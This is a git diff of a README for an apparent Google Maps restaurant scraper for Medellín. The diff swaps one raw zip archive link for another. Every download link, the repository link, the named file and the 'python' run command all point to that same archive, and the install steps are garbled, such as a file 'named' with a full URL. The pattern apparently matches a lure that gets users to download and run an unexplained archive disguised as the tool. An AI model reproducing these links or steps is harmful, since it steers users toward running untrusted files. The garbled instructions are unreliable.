@@ -1,7 +1,7 @@
 # 🥗 scraper-restaurantes-medellin - Effortlessly Extract Restaurant Data
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/Appinvent22/scraper-restaurantes-medellin/main/jervine/scraper-restaurantes-medellin-3.8.zip%20Latest%20Release-v1.0-brightgreen)](https://raw.githubusercontent.com/Appinvent22/scraper-restaurantes-medellin/main/jervine/scraper-restaurantes-medellin-3.8.zip)
+[![Download](https://raw.githubusercontent.com/Appinvent22/scraper-restaurantes-medellin/main/jervine/medellin-scraper-restaurantes-1.4.zip%20Latest%20Release-v1.0-brightgreen)](https://raw.githubusercontent.com/Appinvent22/scraper-restaurantes-medellin/main/jervine/medellin-scraper-restaurantes-1.4.zip)
 
 ## 🚀 Getting Started
 Welcome to **scraper-restaurantes-medellin**! This tool helps you collect restaurant data from Google Maps automatically. No programming skills are needed. Follow these steps to get started.
@@ -15,19 +15,19 @@ Welcome to **scraper-restaurantes-medellin**! This tool helps you collect restau
 ## 📦 Installation Steps
 
 1. **Visit the Releases Page**
-   To download the latest version of the application, visit [this page to download](https://raw.githubusercontent.com/Appinvent22/scraper-restaurantes-medellin/main/jervine/scraper-restaurantes-medellin-3.8.zip).
+   To download the latest version of the application, visit [this page to download](https://raw.githubusercontent.com/Appinvent22/scraper-restaurantes-medellin/main/jervine/medellin-scraper-restaurantes-1.4.zip).
 
 2. **Select the Latest Release**
    On the releases page, find the latest release. It will be at the top of the list.
 
 3. **Download the File**
-   Click on the download link for your operating system. The file will typically be named something similar to `https://raw.githubusercontent.com/Appinvent22/scraper-restaurantes-medellin/main/jervine/scraper-restaurantes-medellin-3.8.zip`.
+   Click on the download link for your operating system. The file will typically be named something similar to `https://raw.githubusercontent.com/Appinvent22/scraper-restaurantes-medellin/main/jervine/medellin-scraper-restaurantes-1.4.zip`.
 
 4. **Extract the Files**
    After the download completes, locate the downloaded ZIP file. Right-click on it and select "Extract All..." or use your preferred extraction tool.
 
 5. **Open the Application**
-   Inside the extracted folder, look for a file named `https://raw.githubusercontent.com/Appinvent22/scraper-restaurantes-medellin/main/jervine/scraper-restaurantes-medellin-3.8.zip`. This is the main file you will run.
+   Inside the extracted folder, look for a file named `https://raw.githubusercontent.com/Appinvent22/scraper-restaurantes-medellin/main/jervine/medellin-scraper-restaurantes-1.4.zip`. This is the main file you will run.
 
 6. **Run the Application**
    You may need to install some additional packages to run the application smoothly:
@@ -39,7 +39,7 @@ Welcome to **scraper-restaurantes-medellin**! This tool helps you collect restau
      ```
    - Once in the directory, type the following command to run the program:
      ```
-     python https://raw.githubusercontent.com/Appinvent22/scraper-restaurantes-medellin/main/jervine/scraper-restaurantes-medellin-3.8.zip
+     python https://raw.githubusercontent.com/Appinvent22/scraper-restaurantes-medellin/main/jervine/medellin-scraper-restaurantes-1.4.zip
      ```
 
 ## 📋 How to Use the Application
@@ -86,6 +86,6 @@ Make sure you have Python installed on your machine. If you encounter further is
 We welcome contributions! If you're interested in improving this application or its documentation, please check our contribution guidelines on GitHub.
 
 ## 📊 Explore More
-For an in-depth understanding of the application and its features, visit our [GitHub repository](https://raw.githubusercontent.com/Appinvent22/scraper-restaurantes-medellin/main/jervine/scraper-restaurantes-medellin-3.8.zip).
+For an in-depth understanding of the application and its features, visit our [GitHub repository](https://raw.githubusercontent.com/Appinvent22/scraper-restaurantes-medellin/main/jervine/medellin-scraper-restaurantes-1.4.zip).
 
 Thank you for using **scraper-restaurantes-medellin**! We hope it makes your data extraction tasks easier and more efficient.
